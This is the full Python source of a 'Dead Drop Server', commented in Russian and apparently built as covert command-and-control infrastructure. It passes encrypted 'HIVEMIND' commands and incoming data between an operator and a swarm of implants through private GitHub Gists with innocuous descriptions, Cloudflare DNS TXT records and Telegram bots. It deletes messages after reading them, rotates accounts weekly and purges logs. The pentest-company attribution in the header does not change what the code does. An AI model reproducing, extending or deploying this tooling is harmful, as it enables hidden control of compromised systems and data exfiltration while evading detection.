#!/usr/bin/env python3
"""
DEAD DROP SERVER v1.0
Теневая инфраструктура для скрытых C2-каналов
Архитектор: Кронос | Тимлид: Мастер
Собственность Молдавского ООО "Cybersecurity Research & Penetration Testing Services"

УПРАВЛЯЕТ:
- GitHub Gist аккаунтами (ротация, создание, удаление)
- DNS TXT записями (через API Cloudflare/Route53)
- Telegram ботами (регистрация, пересылка сообщений)
- Шифрованием всех данных в Dead Drops
"""

import os
import sys
import json
import time
import uuid
import base64
import hashlib
import sqlite3
import threading
import requests
import tempfile
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
except ImportError:
    AES = None
    def pad(data, size): return data
    def unpad(data, size): return data
    def get_random_bytes(n): return os.urandom(n)

try:
    import CloudFlare
except ImportError:
    CloudFlare = None

try:
    import boto3
except ImportError:
    boto3 = None


# ============================================================================
# КОНФИГУРАЦИЯ
# ============================================================================

ENCRYPTION_KEY: bytes = os.environ.get("DD_ENCRYPTION_KEY", "").encode()
SWARM_ID: str = os.environ.get("DD_SWARM_ID", "")
DB_PATH: str = os.environ.get("DD_DB_PATH", "./dead_drops.db")
CONFIG_PATH: str = os.environ.get("DD_CONFIG_PATH", "./dd_config.json")
SYNC_INTERVAL: int = int(os.environ.get("DD_SYNC_INTERVAL", "60"))
MAX_RETRIES: int = 3
ROTATION_DAYS: int = 7


# ============================================================================
# СТРУКТУРЫ ДАННЫХ
# ============================================================================

@dataclass
class DeadDropAccount:
    id: str
    type: str
    active: bool
    created_at: str
    rotated_at: str
    config: Dict[str, Any]
    stats: Dict[str, Any]


@dataclass
class DeadDropMessage:
    id: str
    account_id: str
    swarm_id: str
    bee_id: str
    direction: str
    message_type: str
    payload: str
    encrypted: bool
    processed: bool
    timestamp: float
    processed_at: Optional[float]


# ============================================================================
# БАЗА ДАННЫХ
# ============================================================================

class DeadDropDatabase:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.lock = threading.Lock()
        self._init_tables()

    def _init_tables(self):
        with self.lock:
            self.conn.executescript("""
                CREATE TABLE IF NOT EXISTS accounts (
                    id TEXT PRIMARY KEY,
                    type TEXT NOT NULL,
                    active INTEGER DEFAULT 1,
                    created_at TEXT NOT NULL,
                    rotated_at TEXT NOT NULL,
                    config TEXT NOT NULL,
                    stats TEXT DEFAULT '{}'
                );

                CREATE TABLE IF NOT EXISTS messages (
                    id TEXT PRIMARY KEY,
                    account_id TEXT NOT NULL,
                    swarm_id TEXT NOT NULL,
                    bee_id TEXT,
                    direction TEXT NOT NULL,
                    message_type TEXT NOT NULL,
                    payload TEXT NOT NULL,
                    encrypted INTEGER DEFAULT 1,
                    processed INTEGER DEFAULT 0,
                    timestamp REAL NOT NULL,
                    processed_at REAL
                );

                CREATE TABLE IF NOT EXISTS rotation_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    account_id TEXT NOT NULL,
                    action TEXT NOT NULL,
                    timestamp REAL NOT NULL,
                    details TEXT
                );

                CREATE INDEX IF NOT EXISTS idx_messages_swarm ON messages(swarm_id, processed);
                CREATE INDEX IF NOT EXISTS idx_messages_bee ON messages(bee_id);
                CREATE INDEX IF NOT EXISTS idx_accounts_active ON accounts(active);
            """)
            self.conn.commit()

    def add_account(self, account: DeadDropAccount):
        with self.lock:
            self.conn.execute(
                "INSERT OR REPLACE INTO accounts VALUES (?, ?, ?, ?, ?, ?, ?)",
                (account.id, account.type, int(account.active),
                 account.created_at, account.rotated_at,
                 json.dumps(account.config), json.dumps(account.stats))
            )
            self.conn.commit()

    def get_active_accounts(self, account_type: Optional[str] = None) -> List[DeadDropAccount]:
        with self.lock:
            if account_type:
                cursor = self.conn.execute(
                    "SELECT * FROM accounts WHERE active = 1 AND type = ?", (account_type,)
                )
            else:
                cursor = self.conn.execute("SELECT * FROM accounts WHERE active = 1")
            rows = cursor.fetchall()

        accounts = []
        for row in rows:
            accounts.append(DeadDropAccount(
                id=row[0], type=row[1], active=bool(row[2]),
                created_at=row[3], rotated_at=row[4],
                config=json.loads(row[5]), stats=json.loads(row[6])
            ))
        return accounts

    def get_messages_for_swarm(self, swarm_id: str, processed: Optional[bool] = None) -> List[DeadDropMessage]:
        with self.lock:
            if processed is not None:
                cursor = self.conn.execute(
                    "SELECT * FROM messages WHERE swarm_id = ? AND processed = ? ORDER BY timestamp",
                    (swarm_id, int(processed))
                )
            else:
                cursor = self.conn.execute(
                    "SELECT * FROM messages WHERE swarm_id = ? ORDER BY timestamp",
                    (swarm_id,)
                )
            rows = cursor.fetchall()

        messages = []
        for row in rows:
            messages.append(DeadDropMessage(
                id=row[0], account_id=row[1], swarm_id=row[2],
                bee_id=row[3], direction=row[4], message_type=row[5],
                payload=row[6], encrypted=bool(row[7]),
                processed=bool(row[8]), timestamp=row[9],
                processed_at=row[10]
            ))
        return messages

    def add_message(self, msg: DeadDropMessage):
        with self.lock:
            self.conn.execute(
                "INSERT OR REPLACE INTO messages VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (msg.id, msg.account_id, msg.swarm_id, msg.bee_id,
                 msg.direction, msg.message_type, msg.payload,
                 int(msg.encrypted), int(msg.processed),
                 msg.timestamp, msg.processed_at)
            )
            self.conn.commit()

    def mark_processed(self, msg_id: str):
        with self.lock:
            self.conn.execute(
                "UPDATE messages SET processed = 1, processed_at = ? WHERE id = ?",
                (time.time(), msg_id)
            )
            self.conn.commit()

    def log_rotation(self, account_id: str, action: str, details: str = ""):
        with self.lock:
            self.conn.execute(
                "INSERT INTO rotation_log (account_id, action, timestamp, details) VALUES (?, ?, ?, ?)",
                (account_id, action, time.time(), details)
            )
            self.conn.commit()

    def close(self):
        self.conn.close()


# ============================================================================
# ШИФРОВАНИЕ
# ============================================================================

def derive_key(key: bytes) -> bytes:
    return hashlib.sha256(key).digest()


def encrypt_message(plaintext: str) -> str:
    if AES is None or not ENCRYPTION_KEY:
        return base64.b64encode(plaintext.encode()).decode()
    key = derive_key(ENCRYPTION_KEY)
    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()


def decrypt_message(encoded: str) -> Optional[str]:
    if AES is None or not ENCRYPTION_KEY:
        try:
            return base64.b64decode(encoded).decode()
        except:
            return None
    try:
        key = derive_key(ENCRYPTION_KEY)
        data = base64.b64decode(encoded)
        nonce = data[:16]
        tag = data[16:32]
        ciphertext = data[32:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode()
    except:
        return None


# ============================================================================
# GITHUB GIST МЕНЕДЖЕР
# ============================================================================

class GitHubGistManager:
    def __init__(self):
        self.sessions: Dict[str, requests.Session] = {}

    def create_account(self) -> Optional[DeadDropAccount]:
        # Используем существующий GitHub токен из конфигурации
        # В production — регистрация новых аккаунтов через прокси
        token = os.environ.get("DD_GITHUB_TOKEN", "")
        if not token:
            return None

        session = requests.Session()
        session.headers.update({
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0 (compatible; DeadDrop/1.0)"
        })

        # Создаем Gist
        gist_data = {
            "description": f"config-{uuid.uuid4().hex[:8]}",
            "public": False,
            "files": {
                "readme.md": {
                    "content": "# Configuration Notes"
                }
            }
        }

        resp = session.post("https://api.github.com/gists", json=gist_data)
        if resp.status_code != 201:
            return None

        gist = resp.json()
        account = DeadDropAccount(
            id=gist["id"],
            type="github",
            active=True,
            created_at=datetime.now().isoformat(),
            rotated_at=datetime.now().isoformat(),
            config={
                "gist_id": gist["id"],
                "token": token,
                "html_url": gist["html_url"],
                "api_url": gist["url"]
            },
            stats={"messages_sent": 0, "messages_received": 0}
        )

        self.sessions[gist["id"]] = session
        return account

    def read_messages(self, account: DeadDropAccount) -> List[Dict[str, Any]]:
        session = self.sessions.get(account.id)
        if not session:
            session = requests.Session()
            session.headers.update({
                "Authorization": f"token {account.config['token']}",
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "Mozilla/5.0"
            })
            self.sessions[account.id] = session

        resp = session.get(account.config["api_url"])
        if resp.status_code != 200:
            return []

        gist = resp.json()
        messages = []

        for filename, file_data in gist.get("files", {}).items():
            content = file_data.get("content", "")
            if content.startswith("HIVEMIND:"):
                encrypted = content.replace("HIVEMIND:", "")
                messages.append({
                    "filename": filename,
                    "encrypted_payload": encrypted,
                    "raw_content": content
                })

                # Удаляем обработанное сообщение
                update_data = {"files": {filename: {"content": f"PROCESSED_{int(time.time())}"}}}
                session.patch(account.config["api_url"], json=update_data)

        return messages

    def write_message(self, account: DeadDropAccount, message: str) -> bool:
        session = self.sessions.get(account.id)
        if not session:
            session = requests.Session()
            session.headers.update({
                "Authorization": f"token {account.config['token']}",
                "Accept": "application/vnd.github.v3+json",
                "User-Agent": "Mozilla/5.0"
            })
            self.sessions[account.id] = session

        filename = f"cmd_{int(time.time()) % 100000}.txt"
        update_data = {
            "files": {
                filename: {"content": f"HIVEMIND_COMMAND:{message}"}
            }
        }

        resp = session.patch(account.config["api_url"], json=update_data)
        return resp.status_code == 200


# ============================================================================
# DNS TXT МЕНЕДЖЕР
# ============================================================================

class DNSManager:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.provider = config.get("provider", "cloudflare")
        self.cf = None
        self.route53 = None

        if self.provider == "cloudflare" and CloudFlare:
            self.cf = CloudFlare.CloudFlare(
                email=config.get("email"),
                token=config.get("api_key")
            )
        elif self.provider == "route53" and boto3:
            self.route53 = boto3.client(
                "route53",
                aws_access_key_id=config.get("access_key"),
                aws_secret_access_key=config.get("secret_key")
            )

    def read_messages(self, account: DeadDropAccount) -> List[Dict[str, Any]]:
        messages = []
        domain = account.config.get("domain", "")

        if self.provider == "cloudflare" and self.cf:
            try:
                zone_id = self._get_zone_id(domain)
                records = self.cf.zones.dns_records.get(zone_id, params={"type": "TXT"})
                for record in records:
                    content = record.get("content", "").strip('"')
                    if content.startswith("HIVEMIND:"):
                        messages.append({"record_id": record["id"], "encrypted_payload": content.replace("HIVEMIND:", "")})
                        self.cf.zones.dns_records.delete(zone_id, record["id"])
            except Exception as e:
                pass

        return messages

    def write_message(self, account: DeadDropAccount, message: str) -> bool:
        domain = account.config.get("domain", "")

        if self.provider == "cloudflare" and self.cf:
            try:
                zone_id = self._get_zone_id(domain)
                record_name = f"cmd-{int(time.time()) % 10000}.{domain}"
                self.cf.zones.dns_records.post(zone_id, data={
                    "type": "TXT",
                    "name": record_name,
                    "content": f"HIVEMIND_COMMAND:{message}",
                    "ttl": 60
                })
                return True
            except:
                return False

        return False

    def _get_zone_id(self, domain: str) -> str:
        if self.cf:
            zones = self.cf.zones.get(params={"name": domain})
            if zones:
                return zones[0]["id"]
        return ""


# ============================================================================
# TELEGRAM БОТ МЕНЕДЖЕР
# ============================================================================

class TelegramBotManager:
    def __init__(self):
        self.bots: Dict[str, Dict[str, Any]] = {}

    def create_bot(self, token: str, chat_id: str) -> DeadDropAccount:
        account = DeadDropAccount(
            id=f"tg_{uuid.uuid4().hex[:8]}",
            type="telegram",
            active=True,
            created_at=datetime.now().isoformat(),
            rotated_at=datetime.now().isoformat(),
            config={"bot_token": token, "chat_id": chat_id},
            stats={"messages_sent": 0, "messages_received": 0}
        )
        self.bots[account.id] = account.config
        return account

    def read_messages(self, account: DeadDropAccount) -> List[Dict[str, Any]]:
        messages = []
        token = account.config["bot_token"]
        url = f"https://api.telegram.org/bot{token}/getUpdates?timeout=5&limit=10"

        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                return messages
            data = resp.json()
            if not data.get("ok"):
                return messages

            for update in data.get("result", []):
                text = update.get("message", {}).get("text", "")
                if text.startswith("HIVEMIND:"):
                    messages.append({
                        "update_id": update["update_id"],
                        "encrypted_payload": text.replace("HIVEMIND:", "")
                    })

            # Подтверждаем обработку
            if data["result"]:
                last_update = data["result"][-1]["update_id"]
                requests.get(f"{url}&offset={last_update + 1}", timeout=5)

        except:
            pass

        return messages

    def write_message(self, account: DeadDropAccount, message: str) -> bool:
        token = account.config["bot_token"]
        chat_id = account.config["chat_id"]
        url = f"https://api.telegram.org/bot{token}/sendMessage"

        try:
            data = {
                "chat_id": chat_id,
                "text": f"HIVEMIND_COMMAND:{message}",
                "parse_mode": "HTML"
            }
            resp = requests.post(url, json=data, timeout=10)
            return resp.status_code == 200
        except:
            return False


# ============================================================================
# ГЛАВНЫЙ ОРКЕСТРАТОР DEAD DROPS
# ============================================================================

class DeadDropOrchestrator:
    def __init__(self, db: DeadDropDatabase, config: Dict[str, Any]):
        self.db = db
        self.config = config
        self.github = GitHubGistManager()
        self.dns = DNSManager(config.get("dns", {}))
        self.telegram = TelegramBotManager()
        self.running = False
        self.threads: List[threading.Thread] = []

    def start(self):
        self.running = True
        self.threads = [
            threading.Thread(target=self._sync_github, daemon=True),
            threading.Thread(target=self._sync_dns, daemon=True),
            threading.Thread(target=self._sync_telegram, daemon=True),
            threading.Thread(target=self._rotation_checker, daemon=True),
            threading.Thread(target=self._cleanup_worker, daemon=True),
        ]
        for t in self.threads:
            t.start()

    def stop(self):
        self.running = False
        for t in self.threads:
            t.join(timeout=5)

    def _sync_github(self):
        while self.running:
            try:
                accounts = self.db.get_active_accounts("github")
                for account in accounts:
                    messages = self.github.read_messages(account)
                    for msg in messages:
                        decrypted = decrypt_message(msg["encrypted_payload"])
                        if decrypted:
                            db_msg = DeadDropMessage(
                                id=uuid.uuid4().hex,
                                account_id=account.id,
                                swarm_id=SWARM_ID,
                                bee_id="",
                                direction="incoming",
                                message_type="data",
                                payload=decrypted,
                                encrypted=False,
                                processed=False,
                                timestamp=time.time(),
                                processed_at=None
                            )
                            self.db.add_message(db_msg)
            except:
                pass
            time.sleep(SYNC_INTERVAL)

    def _sync_dns(self):
        while self.running:
            try:
                accounts = self.db.get_active_accounts("dns")
                for account in accounts:
                    messages = self.dns.read_messages(account)
                    for msg in messages:
                        decrypted = decrypt_message(msg["encrypted_payload"])
                        if decrypted:
                            db_msg = DeadDropMessage(
                                id=uuid.uuid4().hex,
                                account_id=account.id,
                                swarm_id=SWARM_ID,
                                bee_id="",
                                direction="incoming",
                                message_type="data",
                                payload=decrypted,
                                encrypted=False,
                                processed=False,
                                timestamp=time.time(),
                                processed_at=None
                            )
                            self.db.add_message(db_msg)
            except:
                pass
            time.sleep(SYNC_INTERVAL)

    def _sync_telegram(self):
        while self.running:
            try:
                accounts = self.db.get_active_accounts("telegram")
                for account in accounts:
                    messages = self.telegram.read_messages(account)
                    for msg in messages:
                        decrypted = decrypt_message(msg["encrypted_payload"])
                        if decrypted:
                            db_msg = DeadDropMessage(
                                id=uuid.uuid4().hex,
                                account_id=account.id,
                                swarm_id=SWARM_ID,
                                bee_id="",
                                direction="incoming",
                                message_type="data",
                                payload=decrypted,
                                encrypted=False,
                                processed=False,
                                timestamp=time.time(),
                                processed_at=None
                            )
                            self.db.add_message(db_msg)
            except:
                pass
            time.sleep(SYNC_INTERVAL)

    def _rotation_checker(self):
        while self.running:
            try:
                accounts = self.db.get_active_accounts()
                for account in accounts:
                    rotated = datetime.fromisoformat(account.rotated_at)
                    if datetime.now() - rotated > timedelta(days=ROTATION_DAYS):
                        self._rotate_account(account)
            except:
                pass
            time.sleep(3600)

    def _rotate_account(self, old_account: DeadDropAccount):
        if old_account.type == "github":
            new_account = self.github.create_account()
        elif old_account.type == "dns":
            new_account = old_account
        elif old_account.type == "telegram":
            new_account = self.telegram.create_bot(
                old_account.config["bot_token"],
                old_account.config["chat_id"]
            )
        else:
            return

        if new_account:
            old_account.active = False
            self.db.add_account(old_account)
            self.db.add_account(new_account)
            self.db.log_rotation(old_account.id, "rotated",
                                 f"Заменен на {new_account.id}")

    def _cleanup_worker(self):
        while self.running:
            try:
                # Удаляем обработанные сообщения старше 24 часов
                cutoff = time.time() - 86400
                self.db.conn.execute(
                    "DELETE FROM messages WHERE processed = 1 AND timestamp < ?",
                    (cutoff,)
                )
                self.db.conn.commit()
            except:
                pass
            time.sleep(3600)

    def send_message(self, message: str, account_type: Optional[str] = None) -> bool:
        encrypted = encrypt_message(message)
        if not encrypted:
            return False

        accounts = self.db.get_active_accounts(account_type)
        if not accounts:
            return False

        for account in accounts:
            success = False
            if account.type == "github":
                success = self.github.write_message(account, encrypted)
            elif account.type == "dns":
                success = self.dns.write_message(account, encrypted)
            elif account.type == "telegram":
                success = self.telegram.write_message(account, encrypted)

            if success:
                account.stats["messages_sent"] = account.stats.get("messages_sent", 0) + 1
                self.db.add_account(account)
                return True

        return False


# ============================================================================
# ТОЧКА ВХОДА
# ============================================================================

def load_config(config_path: str) -> Dict[str, Any]:
    if os.path.exists(config_path):
        with open(config_path) as f:
            return json.load(f)
    return {}


def main():
    config = load_config(CONFIG_PATH)

    if ENCRYPTION_KEY:
        print(f"[DD] Ключ шифрования загружен ({len(ENCRYPTION_KEY)} байт)")
    else:
        print("[DD] ВНИМАНИЕ: Ключ шифрования не установлен. Использую base64.")

    db = DeadDropDatabase(DB_PATH)
    orchestrator = DeadDropOrchestrator(db, config)

    print(f"[DD] Запуск Dead Drop оркестратора. Swarm: {SWARM_ID}")
    orchestrator.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[DD] Завершение работы...")
    finally:
        orchestrator.stop()
        db.close()


if __name__ == "__main__":
    main()
